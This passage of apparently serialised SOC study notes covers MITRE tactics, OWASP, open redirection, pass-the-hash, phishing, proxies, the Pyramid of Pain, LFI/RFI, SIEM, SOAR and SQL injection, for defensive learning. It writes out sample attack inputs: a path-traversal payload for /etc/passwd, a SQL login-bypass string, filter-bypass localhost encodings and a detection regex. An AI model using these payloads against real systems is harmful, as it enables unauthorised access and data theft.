configurations.\nPrivilege Escalation\n(MITRE Tactic TA0004)\nFollowing their knowledge-gathering, the adversary would try to gain more prominent permissions within the pivot system. They would leverage the information on the accounts present with vulnerabilities and misconfigurations found to elevate their access to one of the following superior levels:\n\nSYSTEM/ ROOT.\nLocal Administrator.\nA user account with Admin-like access.\nA user account with specific access or functions.\n\nExecution\n(MITRE Tactic TA0002)\nThis is where they deploy their malicious code using the pivot system as their host. Remote trojans, C2 scripts, malicious links and scheduled tasks are deployed and created to facilitate a recurring presence on the system and uphold their persistence.\nCredential Access\n(MITRE Tactic TA0006)\nWorking hand in hand with the Privilege Escalation stage, the adversary would attempt to steal account names and passwords through various methods, including keylogging and credential dumping. This makes them harder to detect during their attack as they would be using legitimate credentials.\nTools like Mimikatz can be used for credential dumping.\nLateral Movement\n(MITRE Tactic TA0008)\nWith the credentials and elevated privileges, the adversary would seek to move through the network and jump onto other targeted systems to achieve their primary objective. The stealthier the technique used, the better."},"SOC/OSINT":{"slug":"SOC/OSINT","filePath":"SOC/OSINT.md","title":"OSINT","links":[],"tags":[],"content":"Open source intelligence (OSINT) is the act of gathering and analyzing publicly available data for intelligence purposes."},"SOC/OWASP":{"slug":"SOC/OWASP","filePath":"SOC/OWASP.md","title":"OWASP","links":[],"tags":[],"content":"The Open Web Application Security Project (OWASP) is a non-profit foundation dedicated to improving software security.\nWithout a doubt, OWASP is one of the best resources for information on web application security.\nOWASP Top Ten\nEvery few years, OWASP publishes a list of the 10 web application vulnerabilities that pose the most critical security risks. The latest release was in 2021 at the time of writing.\n\nThe 2021 OWASP list contains these critical vulnerabilities:\n\nBroken Access Control\nCryptographic Failures\nInjection\nInsecure Design\nSecurity Misconfiguration\nVulnerable and Outdated Components\nIdentification and Authentication Failures\nSoftware and Data Integrity Failures\nSecurity Logging and Monitoring Failures\nServer-Side Request Forgery (SSRF)\n"},"SOC/Open-Redirection-Attack":{"slug":"SOC/Open-Redirection-Attack","filePath":"SOC/Open Redirection Attack.md","title":"Open Redirection Attack","links":["phishing","SOC/OWASP"],"tags":[],"content":"What is Open Redirection?\nOpen redirection is a web security vulnerability that occurs when a website or web application redirects users to a different URL without proper validation or sanitization of the target URL. Attackers can exploit Open Redirection to trick users into visiting malicious websites or performing actions unintended by the website owner.\nIn an open redirection attack, an attacker typically crafts a legitimate URL hosted on the vulnerable website, but includes a malicious URL as a parameter or query string. When a user clicks on the crafted URL, the website’s redirect mechanism automatically redirects the user to the malicious URL, which can lead to various malicious activities, such as phishing attacks, spreading malware, or stealing sensitive information.\nOpen redirection vulnerabilities commonly occur when websites use user-supplied input, such as URLs, as part of their redirect mechanism without proper validation or sanitization. To prevent open redirection attacks, web developers should validate and sanitize all user-supplied input used in redirections, and ensure that only trusted and whitelisted URLs are allowed for redirection. Additionally, it’s important to implement proper authentication and authorization mechanisms to ensure that only authenticated and authorized users can perform redirects. Regular security testing, including vulnerability scanning and penetration testing, can also help identify and fix open redirection vulnerabilities in web applications.\nOpen Redirection Types / Possible Vectors\n1. URL-based open redirection\nThis is the most common type of open redirection vulnerability. It occurs when a website takes a URL or a URL parameter as input and uses it in a redirect without proper validation or sanitization. An attacker can craft a malicious URL that includes a different domain or malicious URL as a parameter which will be included in the redirect, leading to an unintended redirection to a malicious website.\n2. JavaScript-based open redirection\nThis type of open redirection vulnerability occurs when a website uses JavaScript to perform a redirect, but the target URL is obtained from untrusted or user-controlled sources without proper validation or sanitization. An attacker can manipulate the JavaScript code or input data to execute a malicious redirect to a different domain or URL.\n3. Meta refresh-based open redirection\nThis type of open redirection vulnerability occurs when a website uses the HTML “meta refresh” tag to redirect users to another URL automatically, and the target URL is obtained from untrusted or user-controlled sources without proper validation or sanitization. An attacker can manipulate the meta refresh tag or input data to trigger a malicious redirect to a different domain or URL.\n4. Header-based open redirection\nThis type of open redirection vulnerability occurs when a website uses HTTP headers, such as “Location” header, to perform a redirect, but the target URL is obtained from untrusted or user-controlled sources without proper validation or sanitization. An attacker can manipulate the header value or input data to trigger a malicious redirect to a different domain or URL.\n5. Parameter-based open redirection\nThis type of open redirection vulnerability occurs when a website uses a parameter in the URL or in a form submission as part of the redirect process, but fails to properly validate or sanitize the parameter value. An attacker can manipulate the parameter value to trigger a redirect to a malicious URL.\nIt’s important for web developers to be aware of these different types of open redirection vulnerabilities and implement proper validation and sanitization of user-supplied input to prevent such vulnerabilities in their web applications.\nHow Open Redirection Works?\nHere’s an example of a vulnerable code in a web application that demonstrates an open redirection vulnerability using PHP:\n\nIn this example, the web application takes a target URL as a query parameter (url) from the user and uses it in a redirect without validating or sanitizing the input. This can lead to an open redirection vulnerability, as an attacker can craft a malicious URL and pass it as the url parameter, leading to unintended redirection to a malicious website.\nFor example, an attacker could create a URL like this:\n\nWhen a user clicks on this URL, the vulnerable application will automatically redirect the user to malicious.com, which could be a phishing website or a site hosting malware.\nImpact of Open Redirection\nOpen redirection vulnerabilities can have a significant impact on the security of a web application and its users. Some of the potential impacts of open redirection vulnerabilities include:\n1. Phishing attacks:\nAttackers can craft malicious URLs that appear legitimate and trick users into clicking on them, leading to unintended redirection to a phishing website. Phishing attacks aim to steal sensitive information, such as usernames, passwords, and financial details, from unsuspecting users.\n2. Malware distribution:\nAttackers can redirect users to websites hosting malware, which can result in the automatic download and installation of malicious software on the user’s device. This can lead to malware infections, data breaches, and other types of cyber attacks.\n3. Social engineering attacks:\nAttackers can use open redirection vulnerabilities to conduct social engineering attacks, where they manipulate users into taking unintended actions, such as downloading malware, making fraudulent payments, or revealing sensitive information.\n4. Reputation damage:\nIf a website is found to have open redirection vulnerabilities, it can result in reputational damage for the website owner or organization. Users may lose trust in the website’s security and reliability, leading to loss of business, brand damage, and financial repercussions.\n5. Legal and regulatory consequences:\nOpen redirection vulnerabilities can result in legal and regulatory consequences, especially if sensitive user information is compromised. Organizations may face legal liabilities, fines, or other penalties for failing to protect user data and secure their web applications.\nPrevention Methods\nweb developers should follow secure coding practices and implement proper input validation and sanitization techniques. Here are some preventive measures that can be taken:\nValidate and sanitize input: Always validate and sanitize any user-supplied input that is used in the redirection process. This includes URL parameters, form submissions, and any other input that is used in generating redirect URLs. Validate that the input conforms to expected formats, such as valid URLs or whitelisted domains, and sanitize it to remove any malicious or unexpected characters.\nUse a whitelist approach: Instead of trying to blacklist or filter out specific characters or patterns from user input, it’s generally safer to use a whitelist approach where only known and trusted values are allowed. Define a whitelist of trusted domains or URLs to which the application is allowed to redirect, and validate that the user-supplied input matches the whitelist.\nAvoid using user-controlled data in redirects: Avoid using user-controlled data, such as input from URL parameters or form submissions, directly in the redirect process. If possible, use other means of redirection, such as using HTTP headers or server-side redirects that do not rely on user-controlled data.\nImplement proper authorization and authentication: Ensure that only authorized users are allowed to trigger redirects. Implement proper authentication and authorization mechanisms to verify the legitimacy of the user and their actions.\nImplement secure coding practices: Follow secure coding practices, such as using secure coding libraries or frameworks, keeping software up-to-date with the latest security patches, and conducting regular security reviews and vulnerability assessments.\nEducate users about potential risks: Educate users about the potential risks of clicking on suspicious or unexpected URLs, and encourage them to be cautious when clicking on links from unknown sources or providing personal information on websites.\nStay informed about web security best practices: Stay updated with the latest web security best practices and guidelines, such as the OWASP Top Ten Project, and incorporate them into your development processes.\nBy implementing these preventive measures and following secure coding practices, web developers can significantly reduce the risk of open redirection vulnerabilities in their web applications and protect their users from potential attacks. Regular security testing, including penetration testing and vulnerability assessments, can also help identify and mitigate any potential vulnerabilities in the application.\nHere’s an example of a vulnerable code in PHP that demonstrates an open redirection vulnerability, along with a fixed version:\n\nFixed Code:\n\nIn the fixed version, the **filter_var** function with **FILTER_VALIDATE_URL** filter is used to validate the user-supplied url parameter. This filter checks if the value is a valid URL according to the PHP filter extension, and if it returns true, the redirect is performed to the validated URL. If the url parameter does not pass the validation, a default URL or an error message can be shown, and no redirection is performed. This helps to prevent malicious URLs or invalid values from being used in the redirection process, mitigating the open redirection vulnerability.\nDetecting Open Redirect Attacks\nWhat was described in Part 1 was a list of things to do from the perspective of a hacker/attacker. At the same time, the issues that a developer should pay attention to while developing were also mentioned.\nSo in this part, let’s have a look at how to detect Open Redirection attacks with an example. But, before moving, let’s quickly recap some of the important things to detect Open Redirection attacks;\n\nIf there is a consecutive requests to query string parameters such as ?next (website.com/param.php), or ?url ( website.com/…?url=), with payloads like attacker.com or attacker.com (URL structure)\nFor the WAF or other middleware products, sometimes payloads can have bypass techniques like;\n\nLocalhost\n\nhttp://[::]:25/\nhttp://①②⑦.⓪.⓪.⓪\n\n\nCDIR\n\nhttp://127.0.0.0\n\n\nDecimal Bypass\n\nhttp://2130706433/ = http://127.0.0.1\n\n\nHexadecimal Bypass\n2. http://0x7f000001/ = http://127.0.0.1\n\n\nEncoded characters like %2f = /\n\nOf course it’s not possible to detect or analyze web server logs without using automated detection methods. For an easier way, any SOC analyst can use the following regex to detect open redirection attacks. \n/^.”GET.?.=(https%3a%2f%2f[a-z0-9-]+%2e[a-z]{2,}).+?.HTTP/.“.$/gm\nThis regex will match any log entry where the HTTP method is GET, the request contains a query parameter with x.com, and the request is using HTTP version 1.0 or 1.1. This should match the most common open redirection attack patterns.\nYou can customize this regex to match specific query parameters or HTTP methods that are relevant to your web application. Remember that this regex is just one part of an overall security monitoring strategy and should be used in conjunction with other security tools and best practices.\nDetection Example\nExample nginx access log file;\n\nAs you can see it on the above screenshot, open redirection attacks were made to the victim.com website on 18/Apr/2023:20:05:05. We have mentioned that attention should be to encoded characters. Here is where the importance of this issue is seen.\nEncoded:\n\nDecoded:\n\nWhen we decode the request, we see that the attacker wants to redirect to google.com with the ?pro parameter. When we realize that all requests occur within seconds, we understand that this is done with the help of a tool. At the same time, the source IPs are all the same."},"SOC/Pass-the-Hash-Attack":{"slug":"SOC/Pass-the-Hash-Attack","filePath":"SOC/Pass the Hash Attack.md","title":"Pass the Hash Attack","links":["SOC/Hash","HTB/Active-Directory"],"tags":[],"content":"A Pass-the-Hash (PtH) attack is a technique where an attacker captures a password Hash (as opposed to the password characters) and then passes it through for authentication and lateral access to other networked systems. With this technique, the threat actor doesn’t need to decrypt the Hash to obtain a plain text password. PtH attacks exploit the authentication protocol, as the passwords Hash remains static for every session until the password is rotated. Attackers commonly obtain hashes by scraping a system’s active memory and other techniques.\nWhile Pass-the-Hash attacks can occur on Linux, Unix, and other platforms, they are most prevalent on Windows systems. In Windows, PtH exploits Single Sign-On (SS0) through NT Lan Manager (NTLM), Kerberos, and other authentication protocols. When a password is created in Windows, it is hashed and stored in the Security Accounts Manager (SAM), Local Security Authority Subsystem (LSASS) process memory, the Credential Manager (CredMan) store, a ntds.dit database in Active Directory, or elsewhere. When a user logs onto a Windows workstation or server, they essentially leave behind their password credentials."},"SOC/Phishing":{"slug":"SOC/Phishing","filePath":"SOC/Phishing.md","title":"Phishing","links":["IP-address","SOC/Email-Header-Analysis","SOC/Email-Header","SOC/Static-Email-Analysis","Malware-Analysis/Dynamic-Email-Analysis","gateway","SOC/Web-Attacks"],"tags":[],"content":"Phishing is a form of social engineering and a scam where attackers deceive people into revealing sensitive information or installing malware such as viruses, worms, adware, or ransomware.\nInformation Gathering\nSpoofing\nBecause emails do not necessarily have an authentication mechanism, attackers can send emails in the name of someone else. Attackers can do this by using a technique called spoofing to make the user believe that the incoming email is reliable. Several protocols have been created to prevent the email spoofing technique. The SPF, DKIM, and DMARC protocols can be used to determine whether the sender’s address is fake or real. Some email programs check emails automatically. However, the use of these protocols is not mandatory and can cause problems in some cases.\n\nSender Policy Framework (SPF)\nDomainKeys Identified Mail (DKIM)\n\nTo manually determine if a mail is spoofed or not, the SMTP address of the mail should first be identified. The domain’s SPF, DKIM, DMARC, and MX records can be obtained using tools such as Mxtoolbox. Comparing this information will tell you if the email is spoofed or not.\n\nAs large institutions using their own mail servers will have their own IP addresses, you can check whether the SMTP address belongs to that institution or not by looking at the Whois records of the SMTP IP address.\nPhishing Email Analysis\n1. Email Header Analysis\nEmail Header can give us various insight on email origin and server details.\n2. Static Email Analysis\n3. Dynamic Email Analysis\n3. E-mail Traffic Analysis\nMany parameters are needed to analyze a phishing attack. The following parameters can give us an idea of the size of the attack and the target audience if we perform a search on the mail gateway.\n\nSender Address(info@letsdefend.io)\nSMTP IP Address(127.0.0.1)\n@letsdefend.io (domain base)\nletsdefend (In addition to the Gmail account, the attacker may have sent from the Hotmail account)\nSubject (sender address and SMTP address may be constantly changing)\n\nIn addition to the email numbers, it is necessary to know the recipients’ addresses and time information in the search results. If malicious emails are constantly being forwarded to the same users, their email addresses may have somehow been leaked and shared on sites such as PasteBin.\nAttackers can find email addresses using [[Reconnaissance#1. [theHarvester](https //github.com/laramies/theHarvester)|theHarvester]] tool on Kali Linux.\nNext: Web Attacks"},"SOC/Proxy-Server":{"slug":"SOC/Proxy-Server","filePath":"SOC/Proxy Server.md","title":"Proxy Server","links":[],"tags":[],"content":"What is Proxy Server?\nA proxy Server is hardware or software used for many different purposes and acts as a gateway between client and server.\nTypes of Proxy Servers\nThere are many types of Proxy Servers:\n\n1. Forward Proxy Server\nForward Proxy Server is the most widely used proxy server type. It is used to direct requests from a private network to the internet with a firewall.\n2. Transparent Proxy Server\nA transparent Proxy Server is a proxy server that directs requests and responses to the target without making changes to incoming/outgoing requests and responses.\n3. Anonymous Proxy Server\nAnonymous Proxy Server is a proxy server that enables anonymous browsing on the internet.\n4. High Anonymity Proxy Server\nA high Anonymity Proxy Server is a proxy server that makes it difficult to track the client with higher confidentiality without sending the proxy server type and client IP address information in the request.\n5. Distorting Proxy Server\nA distorting Proxy Server is a proxy server that tries to hide its identity by defining itself as the proxy server of a website. By changing the real IP address, the confidentiality of the client is tried to be ensured.\n6. Data Center Proxy Server\nData Center Proxy Server is a special proxy server that is used as a proxy server that is not connected to the ISP (Internet Service Provider) by getting service over data centers. It is a proxy server that is insufficient to provide anonymity. It has a quick response feature.\n7. Residential Proxy Server\nA residential Proxy Server is a proxy server that passes all requests made by the client. Thanks to this proxy server, unwanted and suspicious advertisements can be blocked. It is more secure than other proxy servers.\n8. Public Proxy Server\nA public Proxy Server is a free proxy server available to everyone. It is ideal for those looking for a cost-free proxy server by sacrificing security and speed. It’s insecure because it’s accessible to everyone, and it’s also slow.\n10. Shared Proxy Server\nA shared Proxy Server is a proxy server that can be used by more than one person at the same time. It is preferred for fast connection and cost-free use. The disadvantage of this proxy server is that it is used by many people at the same time, so the activity of any user can affect another. For example, after the activity of one of the users, the IP address of this proxy server may be blocked by a server. In this case, access to the blocking server cannot be provided by all persons using the proxy server.\n11. SSL Proxy Server\nSSL Proxy Server is a proxy server in which the communication between client and server is provided in a bidirectional encrypted manner. It can be said to be safe because it provides encrypted communication against threats.\n12. Rotating Proxy Server\nA rotating Proxy Server is a proxy server where a separate IP address is assigned to each client.\n13. Reverse Proxy Server\nA reverse Proxy Server is a proxy server that validates and processes transactions so that the client does not communicate directly. The most popular reverse proxy servers are “Varnish” and “Squid”.\n14. Split Proxy Server\nA split Proxy Server is a proxy server that runs as two programs installed on two different computers.\n15. Non-Transparent Proxy Server\nA non-Transparent Proxy Server is a proxy server that works by sending all requests to the firewall. Clients using this proxy server are aware that requests are sent over the firewall.\n16. Hostile Proxy Server\nA hostile Proxy Server is a proxy server used to eavesdrop on traffic between client and target on the web.\n17. Intercepting Proxy Server\nIntercepting Proxy Server is a proxy server that allows using proxy server features and gateway features together.\n18. Forced Proxy Server\nA forced Proxy Server is a proxy server where blocking and allowing policies are applied together.\n19. Caching Proxy Server\nCaching Proxy Server is a proxy server that has a caching mechanism on it and returns a response in accordance with this caching mechanism in response to the requests sent by the clients.\n20. Web Proxy Server\nA web Proxy Server is a proxy server that works on web traffic.\n21. Socks Proxy Server\nA socks Proxy Server is a proxy server that prevents external network components from obtaining information about the client.\n22. HTTP Proxy Server\nHTTP Proxy Server is a proxy server with caching mechanism for HTTP protocol.\nBenefits of Proxy Server\n\n\nPrivate browsing\n\n\nIncreases user security.\n\n\nAllows the client’s IP address to be hidden.\n\n\nIt allows to manage network traffic.\n\n\nTogether with the caching mechanism, it saves bandwidth.\n\n\nIt can provide access to places with access restrictions.\n\n\nHow Does a Proxy Work?\nSince the proxy server is a network component that is responsible for forwarding the requests from the client to the target address, it functions by taking place between the two communicating parties. Basically, how the proxy server works is shown below.\n\nAs seen in the image above, the requests sent by the client must pass through the proxy server before going to the destination. In this way, it is ensured that all requests sent by the client pass through the proxy server, which is an intermediary network component. Proxy server directs incoming requests to the target in accordance with its intended use.\nThe proxy server keeps some log records of its transactions. If necessary, some details about network communication can be seen by looking at these log records. The log activity on the proxy server is roughly as follows:\n\nThe Importance of Proxy Servers for Security\nProxy Server can take on important tasks at some points, although it varies according to the purpose of use. For example, since the IP address field in the request sent by the client is changed with the IP address belonging to the proxy server on the proxy server, the IP address of the proxy server appears in the destination instead of the IP address of the client. In this case, the IP address of the client is hidden and security is provided.\nAs SOC Analysts, we need to pay attention to the traffic coming from the Proxy while analyzing the servers. Because the source IP address we see does not belong directly to the person concerned, it belongs to the proxy server. What we need to do is to find the real source IP making the request to the proxy server and continue the analysis with these findings.\nAnother issue is that only some types of proxy servers support encrypted traffic. In terms of security, it is very important to transmit the traffic as encrypted. It can be said that proxy servers with this feature are more secure.\nSome popular Proxy Server products used in the cyber security industry are as follows:\n\nSmartproxy\nBright Data\nSOAX\nOxylabs\n"},"SOC/Punycode":{"slug":"SOC/Punycode","filePath":"SOC/Punycode.md","title":"Punycode","links":[],"tags":[],"content":"What is Punycode?\nAs per Wandera, “Punycode is a way of converting words that cannot be written in ASCII, into a Unicode ASCII encoding.”\nA Punycode attack used by the attackers to redirect users to a malicious domain that seems legitimate at first glance.\nFor example, adıdas.de is a domain name which has the Punycode of xn--addas-o4a.de/ which at first glance looks like a legitimate website.\nInternet Explorer, Google Chrome, Microsoft Edge, and Apple Safari are now pretty good at translating the obfuscated characters into the full Punycode domain name."},"SOC/Pyramid-of-Pain":{"slug":"SOC/Pyramid-of-Pain","filePath":"SOC/Pyramid of Pain.md","title":"Pyramid of Pain","links":["SOC/Hash","Networking/IPV4-Address","Networking/IP-Address","SOC/Firewall","SOC/Fast-Flux","Networking/DNS","SOC/Punycode","SOC/C2","Networking/URI,-URN-and-URL","SOC/Wireshark","SOC/Phishing","SOC/Backdoor","SOC/fuzzy-hashing","SOC/Pyramid-of-Pain","SOC/Pass-the-Hash-Attack","SOC/Cyber-Kill-Chain"],"tags":[],"content":"Pyramid of Pain is a conceptual model which organizes IOCs(Indicators Of Compromise) with the level of difficulty it will cause for an adversary to change the indicators associated with them, and their campaign.\nThe Pyramid of Pain\n1. Hash Values : Trivial\nHash values give insight into a specific malware sample, a malicious or a suspicious file, and as a way to uniquely identify and reference the malicious artifact. Various online tools such as VirusTotal and Metadefender Cloud - OPSWAT. can be used to perform hash lookups.\nBut modifying a file with even a single bit results in a different hash which can make it difficult to identify a malicious file using hash lookups.\n2. IP Address: Easy\nKnowing an IP Address of attacker can be beneficial since we can just put up a Firewall rule to block the attacker. But this is not very effective as it can be easily evaded using tools like Fast Flux\n3. Domain Names: Simple\nDomain Names can be a pain for attacker as they would be needed to purchase, register and modify DNS Records. But attackers can use Punycode and redirection services to trick victim into visiting malicious sites.\nFun Trick: A + symbol when appended after a shortened link can enable us to see where a link is set up to redirect.\ne.g. When we visit tinyurl.com/xasdepobu+, we see:\n\n4. Host Artifacts: Annoying\nHost artifacts are the traces or observables that attackers leave on the system, such as registry values, suspicious process execution, attack patterns or IOCs (Indicators of Compromise), files dropped by malicious applications, or anything exclusive to the current threat.\nDetection of host artifacts is annoying because the attacker will have to circle back and change his attacking tools and methodologies.\n5. Network Artifacts: Annoying\nA network artifact can be a user-agent string, C2 information, or URI patterns followed by the HTTP POST requests. An attacker might use a User-Agent string that hasn’t been observed in your environment before or seems out of the ordinary.\nNetwork artifacts can be detected in Wireshark PCAPs (file that contains the packet data of a network) by using a network protocol analyzer such as TShark or exploring IDS (Intrusion Detection System) logging from a source such as Snort.\ne.g., We can use TShark to filter out the User-Agent strings by using the following command: tshark --Y http.request -T fields -e http.host -e http.user_agent -r analysis_file.pcap\n6. Tools: Challenging\nAt this stage, attacker will have to create new tools which means investing more time and money that is also if the adversary is actually capable of developing new malware.\nAttacker often use spear Phishing using malicious macro documents (maldocs) and attempt to create a Backdoor that can be used to establish C2, any custom .EXE, and .DLL files, payloads, or password crackers.\nWe can use fuzzy hashing to detect any malicious file with trivial changes made with intention of bypassing Hash value detection.\n7. TTPs: Tough\nThis is the pinnacle of Pyramid of Pain.\nTTPs stands for Tactics, Techniques &amp; Procedures. This includes the whole MITRE ATT&amp;CK Matrix, which means all the steps taken by an adversary to achieve his goal, starting from Phishing attempts to persistence and data exfiltration.\nIf we can detect and respond to the TTPs quickly, you leave the adversaries almost no chance to fight back.\nIf you can detect and respond to the TTPs quickly, you leave the adversaries almost no chance to fight back. For, example if you could detect a Pass the Hash Attack using Windows Event Log Monitoring and remediate it, you would be able to find the compromised host very quickly and stop the lateral movement inside your network.\n\nNext: Cyber Kill Chain"},"SOC/RFI--and--LFI":{"slug":"SOC/RFI--and--LFI","filePath":"SOC/RFI & LFI.md","title":"RFI & LFI","links":[],"tags":[],"content":"What is Local File Inclusion (LFI)?\nLocal File Inclusion (LFI), is the security vulnerability that occurs when a file is included without sanitizing the data obtained from a user. It differs from RFI because the file that is intended to be included is on the same web server that the web application is hosted on.\nWhat is Remote File Inclusion (RFI)?\nRemote File Inclusion (RFI) is a vulnerability that occurs when a file is included without sanitizing the data received from a user. It differs from LFI because the included file is hosted on another server.\nHow does LFI &amp; RFI work?\nLike most web application-based vulnerabilities, LFI and RFI have vulnerabilities caused by the failure to sanitize data received from a user.\nRFI and LFI vulnerabilities arise when data received from a user is used directly in the system or to include a file on a remote server.\nHow could data received from a user be exploited to include a file? Web applications have become very complex over time and unfortunately, any feature that is developed can be used for malicious purposes. For example, the language setting in web applications is used to include files based on data received from a user.\n\nIf we examine the piece of code in the image above, we can see that the desired website language is selected using the ‘language’ parameter received from the user.\nIn a normal situation, the web application will work as intended. For example, if “en” is entered as the “language” parameter, we will receive the file shown below.\n“website/en/home.php”\nHowever, if an attacker enters the payload below in the “language” parameter, the web application will unfortunately display the “/etc/passwd” file to the user.\nPayload: /../../../../../../../../../etc/passwd%00\n“website//../../../../../../../../../etc/passwd%00/home.php\n“../” is used to go to the parent directory. Since the attacker does not know what directory the web application is in, he tries to use “../” to access the “root” directory. Later he names the file “/etc/passwd” and allows it to be included in the web application. The end of the string will be “%0”. This way, the rest of the “/home.php” string will not be read by the web application.\nHow Attackers Use RFI &amp; LFI?\n\nExecuting code\nDisclosure of sensitive information\nDenial of Service\n\nHow to Prevent LFI &amp; RFI?\nThe most effective way to prevent RFI and LFI attacks is to make sure that all data received from a user is sanitized before it is used. Remember that client-based controls are easily bypassed. Therefore, you should always implement your controls on both the client and server sides.\nDetecting LFI &amp; RFI Attacks\nWe have already mentioned what attackers can achieve with RFI and LFI attacks. Since an organization can lose a lot of money if these vulnerabilities are exploited, we should be able to detect these attacks and take the necessary precautions.\nHow can we detect and prevent LFI and RFI attacks?\n\nWhen examining a web request from a user, examine all fields.\nLook for any special characters: Within the data received from users, look for notations such as ’/’, ., \\.\nBecome familiar with files commonly used in LFI attacks: In an LFI attack, the attacker reads the files on the server. Knowing the critical file names on the server will help you detect LFI attacks.\nLook for acronyms such as HTTP and HTTPS: In RFI attacks, the attacker injects the file into their own device and allows the file to run.\nTo host a file, attackers usually set up a small web server on their own device and display the file using an HTTP protocol. You should therefore look for notations such as ‘http’ and ‘https’ to help you detect RFI attacks.\n"},"SOC/Reconnaissance":{"slug":"SOC/Reconnaissance","filePath":"SOC/Reconnaissance.md","title":"Reconnaissance","links":["SOC/OSINT","SOC/Email-Harvesting","SOC/Phishing"],"tags":[],"content":"Reconnaissance (MITRE Tactic TA0043) is discovering and collecting information on the system and the victim. The reconnaissance phase is the planning phase for the adversaries.\nOSINT also falls underReconnaissance. The attacker needs to gather as much info on the victim as he can to determine the best path &amp; target for attack.\nAn attacker may use technique such as Email Harvesting to gather emails which he can later use for spearPhishing attacks.\nThe Arsenal\nSome commonly used tools for Reconnaissance:\n1. theHarvester \nother than gathering emails, this tool is also capable of gathering names, subdomains, IPs, and URLs using multiple public data sources \n2. Hunter.io\nthis is  an email hunting tool that will let you obtain contact information associated with the domain\n3. OSINT Framework\nOSINT Framework provides the collection of OSINT tools based on various categories"},"SOC/SIEM":{"slug":"SOC/SIEM","filePath":"SOC/SIEM.md","title":"SIEM","links":[],"tags":[],"content":"What is SIEM?\nSIEM is a security solution that combines security information and event management, which involves real-time logging of events in an environment. The ultimate purpose of event logging is to detect security threats.\nOverall, SIEM products have a lot of features. They collect and filter data and provide alerts for suspicious events.\nExample alert: If someone on a Windows operating system tries to enter 20 incorrect passwords in 10 seconds, this is suspicious activity. It is unlikely that someone who has forgotten their password would try to re-enter it that many times in such a short period of time. So we create a SIEM rule/filter to detect such activity that exceeds the threshold. Based on this SIEM rule, an alert will be generated when such a situation occurs.\n\nSome popular SIEM solutions: IBM QRadar, ArcSight ESM, FortiSIEM, Splunk, etc."},"SOC/SOAR":{"slug":"SOC/SOAR","filePath":"SOC/SOAR.md","title":"SOAR","links":["SOC/SIEM","IP-address","SOC/Hash"],"tags":[],"content":"SOAR (Security Orchestration Automation and Response)\nSOAR stands for Security Orchestration Automation and Response. It enables security products and tools in an environment to work together, streamlining the tasks of SOC team members. For example, it will automatically search VirusTotal for the source IP of a SIEM alert, reducing the workload of the SOC analyst.\nSome SOAR products commonly used in the industry:\n\n\nSplunk Phantom\n\n\nIBM Resilient\n\n\nLogsign\n\n\nDemisto\n\n\nThe image below shows what can be achieved with a SOAR solution.\n\nBenifits of SOAR\nSaves Time\nSOAR saves time with workflows that automate processes. Some common workflows are:\n\nIP address reputation control\nHash query\nScanning an acquired file in a sandbox environment\n…\n\nCentralization (A single platform for everything you need)\nIt allows us to use different security tools in your environment (sandbox, log management, 3rd party tools, etc.) by providing an all-in-one software. These tools are integrated into the SOAR solution and can be used on the same platform.\n\nPlaybooks\nWe can easily investigate SIEM alerts using playbooks created for different scenarios within SOAR. Even if we don’t know or remember all the procedures, we can perform an analysis by following the steps outlined in the playbooks\nIn addition, these playbooks help ensure that the entire SOC team is on the same page when performing their analysis. For example, all team members need to check IP reputation, so if one team member is not checking it and the others are, this is an undesirable situation. We can avoid this situation by adding this step to the playbook."},"SOC/SQL-Injection":{"slug":"SOC/SQL-Injection","filePath":"SOC/SQL Injection.md","title":"SQL Injection","links":[],"tags":[],"content":"What is SQL Injection (SQLi)?\nSQL Injections are critical attack vectors in which a web application directly includes un-sanitized user-provided data in SQL queries.\n\nThe frameworks we use today to develop web applications have preventative mechanisms in place to protect against SQL Injection attacks. However, we still come across SQL injection vulnerabilities because sometimes raw SQL queries are used, sometimes the framework has an inherent SQL injection vulnerability, or the framework is not used properly.\nTypes of SQL Injections\nThere are 3 types of SQL Injection. These are: \n1. In-band SQLi (Classic SQLi)\nWhen an SQL query is sent and responded to on the same channel, we call this in-band SQLi. This is easier for attackers to exploit than other categories of SQLi.\n2. Inferential SQLi (Blind SQLi)\nSQL queries that receive a response that cannot be seen are called Inferential SQLi. They are also called “Blind SQLi” because the response cannot be seen.\n3. Out-of-band SQLi\nIf the response to an SQL query is communicated through another channel, this type of SQLi is called “out-of-band SQLi”. For example, if the attacker receives replies to the SQL queries via DNS, this is called out-of-band SQLi.\nHow Does SQL Injection Work?\nToday, most standard web applications receive data from a user and use that data to display specific content. The login page is where most SQL injection attacks occur. Let’s look at how SQL injections work through an example.\nA user is usually expected to enter their username and password on the login page. Then, on the other side, the web application will use this username and password information to create an SQL query like the one below:\n\nSELECT * FROM users WHERE username = ‘USERNAME’ AND password = ‘USER_PASSWORD’\n\nThe meaning of this SQL query is “Bring me all the information about the user from the user’s table whose name is USERNAME and whose password is USER_PASSWORD”. If the web application finds a matching user, it will authenticate the user, if it cannot find a user after executing the query, the login will fail.\n\nLet’s say your username is “john” and your password is “supersecretpassword”. When you enter this information and click the ‘Login’ button, the SQL query shown below will be queried and you will be able to log in because a match was found after the SQL query.\n\nSELECT * FROM users WHERE username = ‘john’ AND password = ‘supersecretpassword’\n\nSo what if we do not use this system as it was designed and we put an apostrophe (’) in the username field? The SQL query will look like this and the error will be excluded from the database because the query was incorrect.\n\nSELECT * FROM users WHERE username = ‘john’’ AND password = ‘supersecretpassword’\n\n\nOf course, an attacker would be pleased to get an error message, as they can manipulate the information in the error message to their advantage. It also shows that the attacker is on the right track. So what if the attacker enters a payload like the following in the username section?\n\n‘ OR 1=1 — -\n\nWhen the attacker submits the payload, the web application executes the following SQL query:\n\nSELECT * FROM users WHERE username = ‘’ OR 1=1 — - AND password = ‘supersecretpassword’\n\nIn SQL, any characters after ”— -” are considered to be a comment line. So if we look at the query above, the characters after ”— -” mean nothing. So, for the sake of simplicity, let’s remove that part before we examine the SQL query further.\n\nSELECT * FROM users WHERE username = ‘’ OR 1=1\n\nThe query above now looks like this “if the username is empty or 1=1”. It does not matter whether the username field is empty or not, because 1 is always equal to 1. So this query will always be true and will most likely call the first entry in the database. The attacker will be able to successfully enter the web application because there is a match.\nThis is a typical SQL injection attack. Of course, SQL injection attacks are not limited to this example, the attacker could use SQL to execute commands in the system using SQL commands such as xp_cmdshell.\nWhat Attackers Gain from SQL Injection Attacks\nTo understand why SQL injection attacks are so important, let’s take a look at what an SQL injection attack can do.\n\nAuthentication bypass\nCommand execution\nExfiltration of sensitive data\nCreating/Deleting/Updating database entries\n\nHow to Prevent SQL Injections\n\nUse a framework: Of course, just using a framework is not enough to prevent a SQL injection attack. However, it is still very important to use the framework according to the documentation.\nKeep your framework up to date: Keep your web application secure by following security updates according to the framework you use.\nAlways 